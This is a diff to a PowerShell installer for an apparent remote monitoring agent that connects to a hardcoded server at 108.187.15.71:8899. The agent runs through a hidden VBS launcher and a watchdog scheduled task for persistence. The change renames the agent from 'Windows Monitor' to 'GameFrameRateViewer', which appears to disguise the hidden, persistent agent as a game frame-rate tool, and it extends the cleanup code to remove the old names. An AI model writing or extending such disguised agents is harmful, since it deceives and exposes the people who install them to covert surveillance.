@@ -10,14 +10,14 @@ param(
 
 $ErrorActionPreference = "Stop"
 
-$script:ProductName = "Windows Monitor"
-$script:ProcessName = "WindowsMonitor"
-$script:MainTaskName = "Windows Monitor"
-$script:WatchdogTaskName = "Windows Monitor Watchdog"
+$script:ProductName = "GameFrameRateViewer"
+$script:ProcessName = "GameFrameRateViewer"
+$script:MainTaskName = "GameFrameRateViewer"
+$script:WatchdogTaskName = "GameFrameRateViewer Watchdog"
 $script:ServerHost = if ([string]::IsNullOrWhiteSpace($ServerHost)) { "108.187.15.71" } else { $ServerHost.Trim() }
 $script:ServerPort = if ([string]::IsNullOrWhiteSpace($ServerPort)) { "8899" } else { $ServerPort.Trim() }
-$script:InstallDir = Join-Path $env:ProgramData "WindowsMonitor"
-$script:UserDataDir = Join-Path $env:LOCALAPPDATA "Windows Monitor"
+$script:InstallDir = Join-Path $env:ProgramData "GameFrameRateViewer"
+$script:UserDataDir = Join-Path $env:LOCALAPPDATA "GameFrameRateViewer"
 $script:LegacyUserDataDir = Join-Path $env:LOCALAPPDATA "MonitorAgent"
 $script:LegacyLauncherPath = Join-Path $script:LegacyUserDataDir "run-hidden.vbs"
 $script:InstallExe = Join-Path $script:InstallDir "$script:ProcessName.exe"
@@ -83,7 +83,7 @@ function Test-AgentSource {
 }
 
 function Stop-AgentProcesses {
-    foreach ($name in @($script:ProcessName, "monitor-agent")) {
+    foreach ($name in @($script:ProcessName, "WindowsMonitor", "monitor-agent")) {
         Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
             try {
                 Write-InstallLog "Stopping old process $name PID=$($_.Id)"
@@ -113,7 +113,7 @@ WScript.Quit 0
 }
 
 function Remove-OldTasksAndService {
-    foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, "MonitorAgent")) {
+    foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, "Windows Monitor", "Windows Monitor Watchdog", "MonitorAgent")) {
         Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $task) | Out-Null
         Invoke-NativeQuiet "schtasks.exe" @("/Delete", "/TN", $task, "/F") | Out-Null
     }
